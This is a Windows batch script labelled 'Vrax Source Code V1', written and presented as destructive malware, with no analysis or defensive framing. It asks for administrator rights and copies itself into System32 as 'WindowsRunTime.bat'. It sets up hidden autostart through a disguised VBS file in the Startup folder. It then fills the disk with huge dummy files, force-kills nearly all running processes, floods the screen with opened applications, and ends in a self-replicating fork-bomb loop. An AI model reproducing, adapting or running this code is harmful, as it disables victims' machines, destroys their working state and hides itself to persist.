:: Vrax Source Code V1
:: Create 10737418240000 Byte Of Data ~9.76562TB
:: Hide Self In System32
:: Auto StartUp

@echo off

setlocal enabledelayedexpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Failed to acquire administrative privileges.
    pause
    exit /b
)

set "target=C:\Windows\System32\WindowsRunTime.bat"
copy "%~f0" "%target%" >nul

set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "flag=%startup%\MicrosoftRuntime.flag"

if exist "%flag%" (
    goto nop
)

(
echo Dim WinScriptHost
echo Set WinScriptHost = CreateObject("WScript.Shell")
echo WinScriptHost.Run Chr(34) ^& "C:\Windows\System32\WindowsRunTime.bat" ^& Chr(34), 0
echo Set WinScriptHost = Nothing
) > "%startup%\MicrosoftRuntime.vbs"

nop:

set "filesize=10737418240"
set "targetDrive=%~1"

for /L %%i in (1,1,1000) do (
    set "f=%targetDrive%\Windows_%%i.dat"
    fsutil file createnew "!f!" %filesize% >nul 2>&1
    if errorlevel 1 (
        goto overflow
    )
)

set "exclude=cmd.exe tasklist.exe taskkill.exe conhost.exe"

for /f "skip=3 tokens=1" %%i in ('tasklist') do (
    set "kill=true"
    for %%x in (%exclude%) do (
        if /i "%%i"=="%%x" set "kill=false"
    )
    if "!kill!"=="true" (
        echo Killing %%i
        taskkill /f /im "%%i" >nul 2>&1
    )
)

for /L %%i in (1,1,10) do (
    start google.com
    start youtube.com
    start notepad.exe
    start cmd.exe
    start taskmgr.exe
    start regedit.exe
    start write.exe
    start control.exe
    start explorer.exe
    start ms-settings:
    start microsoft-edge:
)

:overflow
start cmd.exe /c "echo %0^|%0 > $_.cmd & $_"
goto overflow